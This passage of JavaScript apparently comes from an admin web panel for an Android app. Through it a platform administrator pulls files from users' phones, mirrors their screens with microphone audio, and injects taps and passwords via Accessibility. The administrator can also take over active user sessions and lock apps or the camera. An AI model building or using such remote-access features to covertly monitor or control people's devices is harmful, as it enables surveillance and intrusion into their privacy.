        : `<p class="muted">${curPath ? "This folder is empty, or still loading — tap List folder / Refresh." : "Empty — tap List folder, wait a few seconds, then open a folder card."}</p>`
    }`;
  el.querySelectorAll(".btn-admin-grant-root").forEach((btn) => {
    btn.addEventListener("click", () => {
      const g = btn.getAttribute("data-grant") || "";
      if (g) void listAdminFilesFolder(g, "");
    });
  });
  el.querySelectorAll(".file-folder").forEach((btn) => {
    btn.addEventListener("click", () => {
      const idx = Number(btn.getAttribute("data-folder-idx"));
      const entry = entries[idx];
      if (!entry) return;
      const g = String(entry.folderGrantId || grantId || "");
      const next = normalizeAdminFilesPath(entry.relativePath || entry.name || "");
      if (g && next) void listAdminFilesFolder(g, next);
    });
  });
  el.querySelectorAll(".btn-admin-file-dl").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const idx = Number(btn.getAttribute("data-file-idx"));
      const entry = entries[idx];
      if (!entry) return;
      try {
        await downloadAdminFileItem(entry, btn);
      } catch (e) {
        alert(formatApiError(e));
      }
    });
  });
  document.getElementById("btn-admin-files-up")?.addEventListener("click", () => {
    const parent = parentAdminFilesPath(adminFilesBrowse.relativePath);
    if (grantId) void listAdminFilesFolder(grantId, parent);
  }, { once: true });
  document.getElementById("btn-admin-files-list")?.addEventListener("click", () => {
    if (grantId) void listAdminFilesFolder(grantId, adminFilesBrowse.relativePath || "");
  }, { once: true });
  document.getElementById("btn-admin-files-refresh")?.addEventListener("click", () => {
    if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId).then(() => renderFilesPanel());
  }, { once: true });
  document.getElementById("btn-admin-files-inline-close")?.addEventListener("click", () => closeAdminFilesInlineViewer(), { once: true });
}

async function downloadAdminFileItem(entry, btn) {
  if (!exploreCtx) return;
  const grantId = String(entry.folderGrantId || adminFilesBrowse.grantId || "");
  const rel = normalizeAdminFilesPath(entry.relativePath || entry.name || "");
  const key = `adminfile::${exploreCtx.deviceId}::${grantId}::${rel}`;
  const existing = adminFilesItemState.get(key);
  if (existing?.status === "ready" && existing.objectUrl) {
    showAdminFilesInline(existing);
    return;
  }
  let state = { status: "downloading", progress: 3, displayName: entry.name || "file", mimeType: entry.mimeType, type: "file" };
  adminFilesItemState.set(key, state);
  if (btn) {
    btn.textContent = "3%";
    btn.disabled = true;
    btn.classList.add("btn-file-progress");
  }
  try {
    const started = await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/command`,
      {
        method: "POST",
        body: JSON.stringify({
          action: "FILE_DOWNLOAD_REQUEST",
          payload: {
            folderGrantId: grantId,
            documentId: entry.documentId || entry.name,
            relativePath: rel,
            sizeBytes: entry.sizeBytes || 0,
            mimeType: entry.mimeType || "application/octet-stream",
            displayName: entry.name,
          },
        }),
      }
    );
    const transferId = String(started.transfer?.transferId || started.command?.transferId || "");
    if (!transferId) throw new Error("Download did not start");
    const deadline = Date.now() + 90_000;
    while (Date.now() < deadline) {
      const data = await api(
        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}`
      );
      const t = data.transfer || {};
      const st = String(t.status || "");
      const p = Math.max(3, Math.min(99, Number(t.progress) || 3));
      state = { ...state, status: "downloading", progress: p };
      adminFilesItemState.set(key, state);
      if (btn) btn.textContent = `${p}%`;
      if (st === "ready") {
        const url = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
        const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
        if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
        const blob = await res.blob();
        const objectUrl = URL.createObjectURL(blob);
        const ready = {
          status: "ready",
          progress: 100,
          objectUrl,
          mimeType: entry.mimeType || blob.type,
          displayName: entry.name || "file",
          type: String(entry.mimeType || "").startsWith("image/")
            ? "image"
            : String(entry.mimeType || "").startsWith("video/")
              ? "video"
              : String(entry.mimeType || "").startsWith("audio/")
                ? "audio"
                : "file",
        };
        adminFilesItemState.set(key, ready);
        if (btn) {
          btn.textContent = "View";
          btn.disabled = false;
          btn.classList.add("btn-file-ready");
        }
        showAdminFilesInline(ready);
        return;
      }
      if (st === "failed" || st === "cancelled") throw new Error(t.errorMessage || `Transfer ${st}`);
      await new Promise((r) => setTimeout(r, 1200));
    }
    throw new Error("Download timed out — keep phone online and retry.");
  } catch (e) {
    state = { ...state, status: "error", progress: 0 };
    adminFilesItemState.set(key, state);
    if (btn) {
      btn.textContent = "Retry";
      btn.disabled = false;
      btn.classList.add("btn-file-error");
    }
    throw e;
  }
}

function setAdminRcStatus(text) {
  const el = document.getElementById("admin-rc-status");
  if (el) el.textContent = text;
}

function isAdminRcEnabled() {
  return Boolean(document.getElementById("admin-rc-control-enabled")?.checked) && adminRcSessionActive;
}

function adminVideoContentRect(video) {
  const rect = video.getBoundingClientRect();
  const vw = video.videoWidth || 0;
  const vh = video.videoHeight || 0;
  if (!vw || !vh || !rect.width || !rect.height) return null;
  const scale = Math.min(rect.width / vw, rect.height / vh);
  const dispW = vw * scale;
  const dispH = vh * scale;
  const offX = (rect.width - dispW) / 2;
  const offY = (rect.height - dispH) / 2;
  return { rect, vw, vh, scale, dispW, dispH, offX, offY };
}

function adminClientToNormalized(video, clientX, clientY) {
  const c = adminVideoContentRect(video);
  if (!c) return null;
  const localX = clientX - c.rect.left - c.offX;
  const localY = clientY - c.rect.top - c.offY;
  if (localX < 0 || localY < 0 || localX > c.dispW || localY > c.dispH) return null;
  return {
    nx: Math.min(1, Math.max(0, localX / c.dispW)),
    ny: Math.min(1, Math.max(0, localY / c.dispH)),
    markerX: c.offX + localX,
    markerY: c.offY + localY,
  };
}

function showAdminRcMarker(x, y, ok) {
  const marker = document.getElementById("admin-rc-touch-marker");
  if (!marker) return;
  marker.hidden = false;
  marker.style.left = `${x}px`;
  marker.style.top = `${y}px`;
  marker.style.background = ok === false ? "rgba(220,38,38,0.55)" : "rgba(91,92,226,0.55)";
  clearTimeout(showAdminRcMarker._t);
  showAdminRcMarker._t = setTimeout(() => {
    marker.hidden = true;
  }, 650);
}

async function waitAdminCommandResult(commandId, opts = {}) {
  if (!exploreCtx || !commandId) throw new Error("Missing command");
  const timeoutMs = Math.min(Math.max(Number(opts.timeoutMs) || 45000, 5000), 90000);
  const deadline = Date.now() + timeoutMs;
  const base = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/commands/${encodeURIComponent(commandId)}`;
  let poked = false;
  while (Date.now() < deadline) {
    const data = await api(base);
    const cmd = data?.command || data;
    const status = String(cmd?.status || "");
    if (status === "acked") return cmd;
    if (status === "failed" || status === "expired" || status === "ignored") {
      const err = new ApiError(
        cmd.errorMessage || cmd.errorCode || "Command failed",
        cmd.errorCode || "COMMAND_FAILED",
        "",
        cmd
      );
      throw err;
    }
    // Mid-wait: re-wake the phone once so it drains pending module commands.
    if (!poked && Date.now() + timeoutMs - deadline > 4000) {
      poked = true;
      try {
        await api(`${base}/poke`, { method: "POST", body: "{}" });
      } catch {
        /* ignore */
      }
    }
    await new Promise((r) => setTimeout(r, 500));
  }
  const err = new ApiError(
    "Command timed out — phone did not confirm remote control. Keep the AutoReplyBot app open, enable Accessibility + Remote Control, install the latest APK if needed, then retry.",
    "TIMEOUT"
  );
  throw err;
}

async function sendAdminA11yCommand(action, payload = {}, opts = {}) {
  if (!exploreCtx) throw new Error("Select a device first");
  const video = document.getElementById("admin-screen-video");
  const videoMeta = {
    videoWidth: Number(video?.videoWidth || 0),
    videoHeight: Number(video?.videoHeight || 0),
  };
  // Never block the serverless function for A11Y — poll status from the browser.
  const wait = opts.wait === true && opts.serverWait === true;
  const body = {
    action,
    payload: {
      ...payload,
      ...videoMeta,
      clientId: "platform_admin",
      normalized: true,
    },
    wait,
    waitMs: wait ? opts.waitMs || 15000 : undefined,
  };
  const result = await api(
    `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/command`,
    { method: "POST", body: JSON.stringify(body) }
  );
  const command = result?.command || result;
  if (opts.wait !== false && command?.commandId && String(command.status || "pending") === "pending") {
    return waitAdminCommandResult(command.commandId, { timeoutMs: opts.waitMs || 45000 });
  }
  if (command?.status === "failed" || command?.status === "ignored" || command?.status === "expired") {
    throw new ApiError(
      command.errorMessage || command.errorCode || "Command failed",
      command.errorCode || "COMMAND_FAILED",
      "",
      command
    );
  }
  return command;
}

async function startAdminRemoteControlSession() {
  setAdminRcStatus("Starting…");
  try {
    await sendAdminA11yCommand("A11Y_START_SESSION", { durationMs: 30 * 60 * 1000 }, {
      wait: true,
      waitMs: 45000,
    });
    adminRcSessionActive = true;
    setAdminRcStatus("Remote control active");
  } catch (e) {
    adminRcSessionActive = false;
    const box = document.getElementById("admin-rc-control-enabled");
    if (box) box.checked = false;
    const msg = e instanceof Error ? e.message : String(e);
    const code = e?.code || "";
    setAdminRcStatus("Remote control disabled");
    if (/ACCESSIBILITY_REQUIRED|MODULE_DISABLED/i.test(msg) || code === "ACCESSIBILITY_REQUIRED") {
      alert(
        "Accessibility control is disabled on the phone.\n\n" +
          "1) Phone → Management → Remote Control Setup\n" +
          "2) Enable the Accessibility service in Android Settings\n" +
          "3) Turn Remote Control ON in the app\n\n" +
          msg
      );
    } else {
      alert(msg);
    }
  }
}

async function stopAdminRemoteControlSession(emergency) {
  try {
    await sendAdminA11yCommand(
      emergency ? "A11Y_EMERGENCY_STOP" : "A11Y_STOP_SESSION",
      {},
      { wait: true, waitMs: 12000 }
    );
  } catch {
    /* ignore */
  }
  adminRcSessionActive = false;
  setAdminRcStatus("View only");
}

function wireAdminRemoteControl() {
  const video = document.getElementById("admin-screen-video");
  const toggle = document.getElementById("admin-rc-control-enabled");
  toggle?.addEventListener("change", async () => {
    if (toggle.checked) await startAdminRemoteControlSession();
    else await stopAdminRemoteControlSession(false);
  });
  const nav = (action, label) =>
    sendAdminA11yCommand("A11Y_GLOBAL_ACTION", { action }, { wait: true, waitMs: 12000 })
      .then(() => setAdminRcStatus(label))
      .catch((e) => setAdminRcStatus(e.message || String(e)));
  document.getElementById("btn-admin-rc-back")?.addEventListener("click", () => nav(1, "Back"));
  document.getElementById("btn-admin-rc-home")?.addEventListener("click", () => nav(2, "Home"));
  document.getElementById("btn-admin-rc-recents")?.addEventListener("click", () => nav(3, "Recents"));
  document.getElementById("btn-admin-rc-notif")?.addEventListener("click", () => nav(4, "Notifications"));
  document.getElementById("btn-admin-rc-stop")?.addEventListener("click", async () => {
    if (toggle) toggle.checked = false;
    await stopAdminRemoteControlSession(true);
  });
  document.getElementById("btn-admin-rc-set-text")?.addEventListener("click", async () => {
    const text = document.getElementById("admin-rc-text-input")?.value || "";
    try {
      await sendAdminA11yCommand("A11Y_SET_TEXT", { text }, { wait: true });
      setAdminRcStatus("Text / password inserted");
      const input = document.getElementById("admin-rc-text-input");
      if (input) input.value = "";
    } catch (e) {
      setAdminRcStatus(e instanceof Error ? e.message : String(e));
    }
  });
  document.getElementById("btn-admin-rc-clear-text")?.addEventListener("click", async () => {
    try {
      await sendAdminA11yCommand("A11Y_SET_TEXT", { text: "" }, { wait: true });
      setAdminRcStatus("Field cleared");
    } catch (e) {
      setAdminRcStatus(e instanceof Error ? e.message : String(e));
    }
  });
  document.getElementById("admin-rc-text-show")?.addEventListener("change", (ev) => {
    const input = document.getElementById("admin-rc-text-input");
    if (!input) return;
    input.type = ev.target?.checked ? "text" : "password";
  });

  if (!video) return;

  video.addEventListener("pointerdown", (ev) => {
    if (!isAdminRcEnabled()) return;
    const mode = document.getElementById("admin-rc-gesture-mode")?.value || "tap";
    if (mode === "swipe" || mode === "drag") {
      const p = adminClientToNormalized(video, ev.clientX, ev.clientY);
      if (!p) return;
      adminRcDragStart = p;
      video.setPointerCapture?.(ev.pointerId);
    }
  });

  video.addEventListener("pointerup", async (ev) => {
    if (!isAdminRcEnabled()) return;
    const mode = document.getElementById("admin-rc-gesture-mode")?.value || "tap";
    const end = adminClientToNormalized(video, ev.clientX, ev.clientY);
    if (!end) return;
    showAdminRcMarker(end.markerX, end.markerY, true);
    try {
      if ((mode === "swipe" || mode === "drag") && adminRcDragStart) {
        const dx = Math.abs(end.nx - adminRcDragStart.nx);
        const dy = Math.abs(end.ny - adminRcDragStart.ny);
        if (dx < 0.025 && dy < 0.025) {
          setAdminRcStatus("Tap…");
          await sendAdminA11yCommand("A11Y_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
          setAdminRcStatus("Tap sent");
          adminRcDragStart = null;
          return;
        }
        setAdminRcStatus(mode === "drag" ? "Dragging…" : "Swiping…");
        await sendAdminA11yCommand(
          mode === "drag" ? "A11Y_DRAG" : "A11Y_SWIPE",
          {
            nx1: adminRcDragStart.nx,
            ny1: adminRcDragStart.ny,
            nx2: end.nx,
            ny2: end.ny,
            durationMs: mode === "drag" ? 400 : 250,
          },
          { wait: false }
        );
        setAdminRcStatus("Gesture ok");
        adminRcDragStart = null;
        return;
      }
      const now = Date.now();
      if (mode === "double" || (mode === "tap" && now - adminRcLastClickAt < 280)) {
        setAdminRcStatus("Double tap…");
        await sendAdminA11yCommand("A11Y_DOUBLE_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
      } else if (mode === "long" || ev.button === 2) {
        setAdminRcStatus("Long press…");
        await sendAdminA11yCommand(
          "A11Y_LONG_PRESS",
          { nx: end.nx, ny: end.ny, durationMs: 700 },
          { wait: false }
        );
      } else {
        setAdminRcStatus("Tap…");
        await sendAdminA11yCommand("A11Y_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
      }
      adminRcLastClickAt = now;
      setAdminRcStatus("Tap sent");
    } catch (e) {
      showAdminRcMarker(end.markerX, end.markerY, false);
      setAdminRcStatus(e instanceof Error ? e.message : String(e));
    } finally {
      adminRcDragStart = null;
    }
  });

  video.addEventListener("contextmenu", (ev) => {
    if (isAdminRcEnabled()) ev.preventDefault();
  });
}

function setAdminScreenStatus(label) {
  const el = document.getElementById("admin-screen-status");
  if (el) el.textContent = label;
}

function stopAdminScreenStats() {
  if (adminScreenStatsTimer) {
    clearInterval(adminScreenStatsTimer);
    adminScreenStatsTimer = null;
  }
}

function startAdminScreenStats(pc) {
  stopAdminScreenStats();
  const statsEl = document.getElementById("admin-screen-stats");
  adminScreenStatsTimer = setInterval(async () => {
    if (!statsEl || !pc) return;
    try {
      const report = await pc.getStats();
      let fps = "—";
      let bitrate = "—";
      report.forEach((r) => {
        if (r.type === "inbound-rtp" && r.kind === "video") {
          if (r.framesPerSecond != null) fps = String(Math.round(r.framesPerSecond));
          if (r.bytesReceived != null) {
            bitrate = `${Math.round((r.bytesReceived * 8) / 1000)} kb total`;
          }
        }
      });
      statsEl.textContent = `Latency — · FPS ${fps} · Bandwidth ${bitrate}`;
    } catch {
      /* ignore */
    }
  }, 2000);
}

async function startAdminScreenMirror() {
  if (!exploreCtx) throw new Error("Select a device first");
  const { ownerUid, deviceId } = exploreCtx;
  const withAudio = Boolean(document.getElementById("admin-screen-audio")?.checked);
  const capabilities = withAudio ? ["screenMirror", "microphone"] : ["screenMirror"];
  const quality = document.getElementById("admin-screen-quality")?.value || "720p";
  const fps = Number(document.getElementById("admin-screen-fps")?.value || 30);
  const status = document.getElementById("screen-live-status");
  const video = document.getElementById("admin-screen-video");
  const audio = document.getElementById("admin-screen-audio-el");
  setAdminScreenStatus("Preparing");
  try {
    await stopLiveViewer();
    stopAdminScreenStats();
    if (status) status.textContent = "Starting screen mirror…";
    if (video) video.hidden = false;

    let result;
    try {
      result = await api(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
        {
          method: "POST",
          body: JSON.stringify({ capabilities, forceReplace: false, quality, fps }),
        }
      );
    } catch (e) {
      if (e instanceof ApiError && e.code === "USER_SESSION_ACTIVE") {
        const ok = confirm(
          `${e.message}\n\n${e.howTo || ""}\n\nTake over now? (Ends their same-type live session only.)`
        );
        if (!ok) {
          if (status) status.textContent = "Cancelled — user session left running.";
          setAdminScreenStatus("Idle");
          return;
        }
        result = await api(
          `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
          {
            method: "POST",
            body: JSON.stringify({ capabilities, forceReplace: true, quality, fps }),
          }
        );
      } else {
        throw e;
      }
    }
    if (!firebaseConfig) throw new Error("Firebase config missing");
    if (!video) throw new Error("Video element missing");
    activeLiveSessionId = String(result.sessionId || "");
    if (status) {
      status.textContent =
        result.notes ||
        "Accept screen capture on the phone (Android system prompt).";
    }
    liveViewer = await startAdminLiveViewer({
      firebaseConfig,
      customToken: result.customToken,
      ownerUid: result.ownerUid,
      sessionId: result.sessionId,
      iceServers: Array.isArray(result.iceServers)
        ? result.iceServers
        : result.iceServers?.iceServers || [],
      videoEl: video,
      audioEl: audio || undefined,
      onStatus: (m) => {
        if (status) status.textContent = m;
        if (/receiving video|connected/i.test(m)) setAdminScreenStatus("Mirroring");
      },
    });
    if (liveViewer?.pc) startAdminScreenStats(liveViewer.pc);
    setAdminScreenStatus("Waiting for Permission");
  } catch (e) {
    activeLiveSessionId = "";
    setAdminScreenStatus("Idle");
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

async function refreshAdminRcTree() {
  setAdminRcStatus("Loading elements…");
  try {
    const result = await sendAdminA11yCommand("A11Y_TREE", {}, { wait: true, waitMs: 45000 });
    const summary = String(result?.resultSummary || "");
    const m = summary.match(/tree:(\d+)/);
    const version = m ? m[1] : "";
    const meta = document.getElementById("admin-rc-tree-meta");
    if (!version || !exploreCtx) {
      if (meta) meta.textContent = summary || "Tree requested";
      setAdminRcStatus("Remote control active");
      return;
    }
    const data = await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/accessibility/tree?version=${encodeURIComponent(version)}`
    );
    const tree = data.tree || {};
    adminRcTreeNodes = Array.isArray(tree.nodes) ? tree.nodes : [];
    if (meta) {
      meta.textContent = `${tree.packageName || "app"} · ${adminRcTreeNodes.length} elements · v${version}`;
    }
    renderAdminRcTreeList(document.getElementById("admin-rc-tree-search")?.value || "");
    setAdminRcStatus("Remote control active");
  } catch (e) {
    setAdminRcStatus(e instanceof Error ? e.message : String(e));
  }
}

function renderAdminRcTreeList(filter) {
  const list = document.getElementById("admin-rc-tree-list");
  if (!list) return;
  const q = String(filter || "").toLowerCase().trim();
  const items = adminRcTreeNodes.filter((n) => {
    if (!q) return n.clickable || n.editable || n.scrollable || n.checkable;
    const hay = `${n.text || ""} ${n.contentDescription || ""} ${n.className || ""}`.toLowerCase();
    return hay.includes(q);
  }).slice(0, 80);
  if (!items.length) {
    list.textContent = "No matching elements.";
    list.classList.add("muted");
    return;
  }
  list.classList.remove("muted");
  list.innerHTML = items
    .map((n) => {
      const label = escapeHtml(
        (n.text || n.contentDescription || n.className || "element").slice(0, 80)
      );
      const flags = [
        n.clickable ? "click" : "",
        n.editable ? "edit" : "",
        n.scrollable ? "scroll" : "",
      ]
        .filter(Boolean)
        .join(" · ");
      return `<button type="button" class="rc-tree-item" data-node-id="${escapeHtml(n.id)}">
        <strong>${label}</strong><br/><span class="muted">${escapeHtml(flags || n.className || "")}</span>
      </button>`;
    })
    .join("");
  list.querySelectorAll(".rc-tree-item").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const nodeId = btn.getAttribute("data-node-id");
      if (!nodeId || !isAdminRcEnabled()) return;
      setAdminRcStatus("Clicking element…");
      try {
        await sendAdminA11yCommand("A11Y_NODE_ACTION", { nodeId, nodeAction: "CLICK" }, { wait: false });
        setAdminRcStatus("Element clicked");
      } catch (e) {
        setAdminRcStatus(e instanceof Error ? e.message : String(e));
      }
    });
  });
}

function wireAdminScreenMirrorPanel() {
  if (adminScreenMirrorWired) return;
  adminScreenMirrorWired = true;
  wireAdminRemoteControl();
  document.getElementById("btn-admin-screen-start")?.addEventListener("click", () => {
    void startAdminScreenMirror();
  });
  document.getElementById("btn-admin-screen-stop")?.addEventListener("click", async () => {
    if (adminRcSessionActive) await stopAdminRemoteControlSession(false);
    const box = document.getElementById("admin-rc-control-enabled");
    if (box) box.checked = false;
    stopAdminScreenStats();
    await stopLiveViewer();
    setAdminScreenStatus("Idle");
    const st = document.getElementById("screen-live-status");
    if (st) st.textContent = "Screen mirror stopped.";
    const v = document.getElementById("admin-screen-video");
    if (v) {
      v.hidden = true;
      v.srcObject = null;
    }
  });
  document.getElementById("btn-admin-screen-lock")?.addEventListener("click", async () => {
    if (!exploreCtx) return;
    try {
      setAdminScreenStatus("Locking…");
      await runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_LOCK", {});
      setAdminScreenStatus("Locked");
    } catch (e) {
      setAdminScreenStatus("Idle");
      alert(formatApiError(e));
    }
  });
  document.getElementById("btn-admin-screen-unlock")?.addEventListener("click", async () => {
    if (!exploreCtx) return;
    try {
      setAdminScreenStatus("Waking…");
      await runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_UNLOCK", {});
      setAdminScreenStatus("Unlock / wake sent");
    } catch (e) {
      setAdminScreenStatus("Idle");
      alert(formatApiError(e));
    }
  });
  document.getElementById("btn-admin-screen-fullscreen")?.addEventListener("click", () => {
    const v = document.getElementById("admin-screen-video");
    if (v?.requestFullscreen) v.requestFullscreen().catch(() => {});
  });
  document.getElementById("btn-admin-screen-pip")?.addEventListener("click", () => {
    const v = document.getElementById("admin-screen-video");
    if (v && document.pictureInPictureEnabled) {
      v.requestPictureInPicture().catch(() => {});
    }
  });
  document.getElementById("btn-admin-screen-shot")?.addEventListener("click", () => {
    const v = document.getElementById("admin-screen-video");
    const canvas = document.getElementById("admin-screen-shot-canvas");
    const preview = document.getElementById("admin-screen-shot-preview");
    if (!v || !canvas || !v.videoWidth) {
      alert("No live frame yet");
      return;
    }
    canvas.width = v.videoWidth;
    canvas.height = v.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(v, 0, 0);
    const url = canvas.toDataURL("image/jpeg", 0.92);
    if (preview) {
      preview.hidden = false;
      preview.innerHTML = `<img src="${url}" alt="Screenshot" style="max-width:100%;border-radius:12px" />
        <a class="btn-secondary" href="${url}" download="screen-${Date.now()}.jpg">Download</a>`;
    }
  });
  document.getElementById("btn-admin-rc-tree")?.addEventListener("click", () => {
    void refreshAdminRcTree();
  });
  document.getElementById("admin-rc-tree-search")?.addEventListener("input", (ev) => {
    renderAdminRcTreeList(ev.target?.value || "");
  });
}

function renderScreenPanel() {
  if (!exploreCtx) return;
  adminRcSessionActive = false;
  adminRcDragStart = null;
}

function adminAppsBlockDurationMinutes() {
  const n = Number(document.getElementById("admin-apps-block-duration")?.value || 30);
  return Number.isFinite(n) ? n : 30;
}

function adminFormatBlockRemaining(expiresAt) {
  if (!expiresAt || expiresAt <= 0) return "Until unblocked";
  const ms = expiresAt - Date.now();
  if (ms <= 0) return "Expired";
  const m = Math.ceil(ms / 60000);
  if (m < 60) return `${m} min left`;
  const h = Math.floor(m / 60);
  const rem = m % 60;
  return rem ? `${h}h ${rem}m left` : `${h}h left`;
}

function isAdminPackageBlockedNow(packageName) {
  return adminActiveBlocks.some(
    (b) => b.status === "active" && b.packageName === packageName && b.mode !== "camera_hw"
  );
}

function alertAdminAppControlError(e) {
  const msg = e instanceof Error ? e.message : formatApiError(e);
  if (/appControl|CAPABILITY_DENIED/i.test(msg)) {
    alert(
      "App Control not allowed.\n\nPhone must have Accessibility + App Control enabled.\n\n" + msg
    );
  } else if (/ACCESSIBILITY_REQUIRED/i.test(msg)) {
    alert("Phone must enable App Control Accessibility.\n\n" + msg);
  } else if (/DEVICE_ADMIN_REQUIRED/i.test(msg)) {
    alert("Camera hardware lock needs Device Admin on the phone.\n\n" + msg);
  } else {
    alert(msg);
  }
}

async function sendAdminAppControl(op, packageName = "", appName = "", mode = "app") {
  if (!exploreCtx) throw new Error("Select a device first");
  const durationMinutes = adminAppsBlockDurationMinutes();
  const durationMs = durationMinutes > 0 ? Math.round(durationMinutes * 60 * 1000) : 0;
  let action = "APP_BLOCKS_SYNC";
  /** @type {Record<string, unknown>} */
  let payload = {};
  if (op === "SYNC") {
    action = "APP_BLOCKS_SYNC";
  } else if (op === "CAMERA_LOCK") {
    action = "APP_BLOCK";
    payload = {
      packageName: "__camera_hardware__",
      appName: "Camera hardware",
      mode: "camera_hw",
      durationMs,
    };
  } else if (op === "CAMERA_UNLOCK") {
    action = "APP_UNBLOCK";
    payload = { packageName: "__camera_hardware__", mode: "camera_hw" };
  } else if (op === "BLOCK") {
    action = "APP_BLOCK";
    payload = { packageName, appName: appName || packageName, mode, durationMs };
  } else if (op === "UNBLOCK") {
    action = "APP_UNBLOCK";
    payload = { packageName, mode };
  }
  await api(
    `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/command`,
    { method: "POST", body: JSON.stringify({ action, payload }) }
  );
}

async function refreshAdminAppsBlocksPanel() {
  const box = document.getElementById("admin-apps-blocks");
  if (!box || !exploreCtx) return;
  try {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps/blocks`
    );
    const items = (data.items || []).filter((b) => b.status === "active");
    adminActiveBlocks = items;
    if (!items.length) {
      box.textContent = "No apps locked.";
      box.classList.add("muted");
      return;
    }
    box.classList.remove("muted");
    box.innerHTML = items
      .map((b) => {
        const title =
          b.mode === "camera_hw" ? "Camera hardware" : escapeHtml(b.appName || b.packageName);
        return `<div class="block-row surface" data-package="${escapeHtml(b.packageName)}">
          <div>
            <strong>${title}</strong>
            <div class="muted">${escapeHtml(b.packageName)} · ${adminFormatBlockRemaining(b.expiresAt)}</div>
          </div>
          <button type="button" class="btn-secondary btn-admin-unlock-pkg" data-package="${escapeHtml(b.packageName)}" data-mode="${escapeHtml(b.mode || "app")}">Unlock</button>
        </div>`;
      })
      .join("");
    box.querySelectorAll(".btn-admin-unlock-pkg").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const pkg = btn.getAttribute("data-package");
        const mode = btn.getAttribute("data-mode") || "app";
        if (!pkg) return;
        try {
          await sendAdminAppControl(mode === "camera_hw" ? "CAMERA_UNLOCK" : "UNBLOCK", pkg, "", mode);
          await refreshAdminAppsBlocksPanel();
          await refreshAdminAppsPanel();
        } catch (e) {
          alertAdminAppControlError(e);
        }
      });
    });
  } catch (e) {
    box.textContent = e instanceof Error ? e.message : String(e);
    box.classList.add("muted");
  }
}

async function refreshAdminAppsPanel() {
  const list = document.getElementById("admin-apps-list");
  const detail = document.getElementById("admin-app-detail");
  if (!list || !exploreCtx) return;
  if (detail) detail.hidden = true;
  const q = document.getElementById("admin-apps-search")?.value || "";
  const filter = document.getElementById("admin-apps-filter")?.value || "user";
  try {
    await refreshAdminAppsBlocksPanel();
    const url =
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps` +
      `?q=${encodeURIComponent(q)}&filter=${encodeURIComponent(filter === "blocked" ? "all" : filter)}`;
    const data = await api(url);
    let items = data.items || [];
    if (filter === "blocked") {
      const blockedPkgs = new Set(
        adminActiveBlocks.filter((b) => b.mode !== "camera_hw").map((b) => b.packageName)
      );
      items = items.filter((a) => blockedPkgs.has(a.packageName));
    }
    if (!items.length) {
      list.textContent =
        filter === "blocked"
          ? "No locked apps right now."
          : filter === "user"
            ? "No user apps found. Tap Sync from phone, or switch Filter to All apps."
            : "No apps indexed yet. Tap Sync from phone.";
      list.classList.add("muted");
      return;
    }
    list.classList.remove("muted");
    list.innerHTML = items
      .map((a) => {
        const blocked = isAdminPackageBlockedNow(a.packageName);
        const name = escapeHtml(a.appName || a.packageName);
        const pkg = escapeHtml(a.packageName);
        return `<article class="app-row surface${blocked ? " is-blocked" : ""}" data-package="${pkg}">
          <div class="app-row-main">
            <strong>${name}${blocked ? '<span class="app-badge-blocked">Locked</span>' : ""}</strong>
            <span class="muted">${pkg}</span>
            <span class="muted">v${escapeHtml(a.versionName || "?")} · ${a.isSystem ? "System" : "User"} · ${escapeHtml(a.category || "")}</span>
          </div>
          <div class="app-row-actions">
            <button type="button" class="btn-secondary btn-admin-app-details" data-package="${pkg}">Details</button>
            ${
              blocked
                ? `<button type="button" class="btn-primary btn-admin-app-unlock" data-package="${pkg}" data-name="${name}">Unlock</button>`
                : `<button type="button" class="btn-danger-soft btn-admin-app-lock" data-package="${pkg}" data-name="${name}">Lock</button>`
            }
          </div>
        </article>`;
      })
      .join("");
    list.querySelectorAll(".btn-admin-app-details").forEach((btn) => {
      btn.addEventListener("click", () => {
        const pkg = btn.getAttribute("data-package");
        if (pkg) void openAdminAppDetail(pkg);
      });
    });
    list.querySelectorAll(".btn-admin-app-lock").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const pkg = btn.getAttribute("data-package") || "";
        const name = btn.getAttribute("data-name") || pkg;
        if (!pkg) return;
        btn.disabled = true;
        try {
          await sendAdminAppControl("BLOCK", pkg, name, "app");
          setTimeout(async () => {
            await refreshAdminAppsBlocksPanel();
            await refreshAdminAppsPanel();
          }, 1200);
        } catch (e) {
          btn.disabled = false;
          alertAdminAppControlError(e);
        }
      });
    });
    list.querySelectorAll(".btn-admin-app-unlock").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const pkg = btn.getAttribute("data-package") || "";
        if (!pkg) return;
        btn.disabled = true;
        try {
          await sendAdminAppControl("UNBLOCK", pkg, "", "app");
          setTimeout(async () => {
